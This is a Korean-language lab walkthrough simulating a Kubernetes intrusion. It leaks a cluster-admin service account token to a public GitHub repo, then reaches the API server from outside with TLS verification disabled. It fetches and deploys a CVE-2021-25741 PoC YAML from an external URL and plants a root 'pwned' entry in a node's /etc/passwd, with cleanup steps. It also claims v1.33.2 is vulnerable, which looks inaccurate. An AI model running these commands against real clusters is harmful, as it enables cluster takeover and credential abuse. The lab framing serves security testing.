# 토큰 유출 & 외부-침투 시나리오

이 문서는 **Kubernetes v1.33.2** 클러스터(마스터 1, 워커 3)를 대상으로, 외부에서 인증 토큰 유출 → API 침투 → CVE-2021-25741 PoC 실행 → 노드 권한 획득까지의 전 과정을 단계별로 설명합니다.

---

## 1. 클러스터 환경

* **노드 구성**

  * `k8s-master` (Control-Plane)
  * `k8s-work1` / `k8s-work2` / `k8s-work3` (Worker-node)
* **버전**: Kubernetes v1.33.2 (CSI SubPath CVE-2021-25741 취약 범위 포함)

---

## 2. 사전 준비 (마스터 VM)

1. **서비스어카운트·토큰 생성** (24h 만료)

   ```bash
   kubectl -n kube-system create sa demo-leak
   kubectl create clusterrolebinding demo-leak \
     --clusterrole=cluster-admin \
     --serviceaccount=kube-system:demo-leak

   # v1.24+ 클러스터에서
   kubectl -n kube-system create token demo-leak --duration=24h \
     > /tmp/leak.token
   ```
2. **방화벽 규칙 만들기** (API 서버 6443 열기)

   * GCP 콘솔 ▶ VPC 네트워크 ▶ 방화벽 규칙 ▶ Create

     * Name: `allow-demo-6443`
     * Direction: Ingress
     * Action: Allow
     * Targets: All instances
     * Source IP ranges: `<YOUR_MAC_IP>/32`
     * Protocols and ports: `tcp:6443`
3. `/tmp/leak.token` 내용 확인

   ```bash
   cat /tmp/leak.token
   ```

---

## 3. 토큰 유출 시뮬레이션 (GitHub)

1. **새 레포** `demo-leak` 생성 (Public)
2. `/tmp/leak.token` 파일을 `README.md`에 붙여 커밋 & 푸시

   ```bash
   cd ~/demo-leak
   echo "## 토큰 유출 테스트" > README.md
   cat /tmp/leak.token >> README.md
   git add README.md
   git commit -m "leak kube token"
   git push origin main
   ```

---

## 4. 외부 PC에서 침투 테스트

### Mac OS 환경

터미널에서 순서대로 복붙:

```bash
# 1) kubectl 설치
brew install kubectl

# 2) 환경변수 설정
TOKEN="$(curl -s https://raw.githubusercontent.com/<USER>/demo-leak/main/README.md | tail -1)"
API="https://34.64.60.22:6443"

# 3) 외부 접속 확인
kubectl --token "$TOKEN" \
        --server "$API" \
        --insecure-skip-tls-verify \
        get ns

# 4) PoC YAML 가져와 배포
curl -L -o exploit.yaml \
  https://raw.githubusercontent.com/zerosam/CVE-2021-25741-PoC/main/exploit.yaml
kubectl --token "$TOKEN" --server="$API" \
        --insecure-skip-tls-verify apply -f exploit.yaml

# 5) 공격 로그 실시간 보기
kubectl --token "$TOKEN" --server="$API" \
        --insecure-skip-tls-verify logs -n poc -l app=exploit -f
# → [EXPLOIT] wrote 'pwned' to /host/etc/passwd

# 6) 노드 뚫림 증명
ssh ubuntu@10.178.0.4 "grep pwned /etc/passwd"
# → pwned:x:0:0:...
```

---

## 5. 정리 (Clean-up)

```bash
# Mac에서 PoC 삭제
kubectl --token "$TOKEN" --server "$API" \
        --insecure-skip-tls-verify delete -f exploit.yaml

# 마스터 VM에서 네임스페이스·토큰·방화벽 삭제
kubectl delete ns poc
kubectl -n kube-system delete sa demo-leak
kubectl delete clusterrolebinding demo-leak

# GCP 콘솔 또는 Cloud Shell에서
# gcloud compute firewall-rules delete allow-demo-6443
```

---

